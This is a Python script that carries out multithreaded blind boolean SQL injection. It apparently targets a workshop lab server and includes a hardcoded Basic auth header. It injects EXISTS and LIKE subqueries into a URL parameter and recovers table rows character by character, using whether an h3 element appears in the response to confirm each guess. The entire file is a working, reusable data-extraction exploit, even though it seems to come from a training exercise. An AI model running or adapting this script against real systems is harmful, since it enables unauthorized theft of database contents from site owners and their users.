from requests import post
from bs4 import BeautifulSoup as BS
from threading import Thread, Lock
from string import digits, ascii_lowercase

TIMEOUT = 30
CHARACTERS = digits + ascii_lowercase
URL = 'http://10.0.23.24:8080/sqli/level07/?news&id=1'
HEADERS = {'Authorization': 'Basic d29ya3Nob3A6d29ya3Nob3A='}


class SQLInjection():
    data, lock = {}, Lock()

    # return the extracted data for a given table
    def get_data_table(self: object, table_name: str) -> dict:
        return self.data.get(table_name)

    # insert data for a particular column and in a particular table
    def insert_data_table(self: object, table_name: str, column_name: str, column_value, id: int) -> None:
        with self.lock:
            # if table does not exist in data, create an entry for it
            if table_name not in self.data:
                self.data[table_name] = {}

            # if id not already table, create an entry for it
            if id not in self.data.get(table_name, {}):
                self.data[table_name][id] = {}

            # insert the data for a particular entry in the particular table
            self.data[table_name][id][column_name] = column_value

    # the main function for data extraction, which calls the other functions
    def extract_rows_data(self: object, table_name: str, column_names: list) -> None:
        offset, threads = 0, []

        # iterate while there are enough rows in the table
        while True:
            # if no such table exists, exit the loop
            if not payload_success(f' AND EXISTS(SELECT * FROM {table_name} LIMIT 1 OFFSET {offset})'):
                break

            # create thread for the n-th row and start it
            thread = Thread(target=self.__extract_row, args=(table_name, column_names, offset))
            offset += 1

            thread.start()
            threads.append(thread)

        # wait until all threads have finished executing
        for thread in threads:
            thread.join(TIMEOUT)

    # creates separate threads for each column in a particular row in order to extract the whole row
    def __extract_row(self: object, table_name: str, column_names: list, offset: int) -> None:
        threads = []

        # iterate over all columns and create and start a separate thread for each of them
        for column_name in column_names:
            thread = Thread(target=self.__extract_row_column, args=(table_name, column_name, '', offset))

            thread.start()
            threads.append(thread)

        # wait until all threads have finished executing
        for thread in threads:
            thread.join(TIMEOUT)

    def __extract_row_column(self: object, table_name: str, column_name: str, column_value, offset: int) -> None:
        # check extracted data one last time and if payload is successful, save that data into the dictionary
        if self.__test_column_value(table_name, column_name, column_value, offset):
            self.insert_data_table(table_name, column_name, column_value, str(offset))
            return

        threads = []

        # iterate and try to guess each character
        for c in CHARACTERS:
            # if there is such row starting with the value column_value + c, create and start a new thread for it and recursively call this function
            if payload_success(f' AND EXISTS(SELECT * FROM {table_name} WHERE {column_name} LIKE \'{column_value + c}%\' LIMIT 1 OFFSET {offset})'):
                thread = Thread(target=self.__extract_row_column, args=(table_name, column_name, column_value + c, offset))

                thread.start()
                threads.append(thread)

        # wait until all threads have finished executing
        for thread in threads:
            thread.join(TIMEOUT)

    # the last test/check before inserting the data into the dictionary
    def __test_column_value(self: object, table_name: str, column_name: str, column_value: str, offset: int) -> bool:
        return payload_success(f' AND EXISTS(SELECT * FROM {table_name} WHERE {column_name}=\'{column_value}\' LIMIT 1 OFFSET {offset})')


# tests if a payload is successful by checking if a particular element (h3) exists on the page
def payload_success(sql: str) -> bool:
    response = post(f'{URL}{sql}', headers=HEADERS)
    soup = BS(response.content, 'lxml')

    return soup.find('h3') != None
